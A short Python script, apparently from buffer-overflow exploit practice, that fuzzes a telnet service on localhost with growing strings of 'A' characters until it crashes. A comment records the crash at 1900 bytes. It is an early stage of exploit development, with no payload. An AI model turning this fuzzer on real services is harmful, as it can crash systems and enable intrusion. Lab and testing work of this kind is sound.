import sys, socket
import time

buffer = "A" * 100

while True:

 try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(('127.0.0.1',23))
     s.recv(1024)
     buffer = buffer + "A" * 100
     s.send((buffer))
     s.close()
     time.sleep(1)

 except:
        #Fuzzing crashed at 1900 bytes
        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()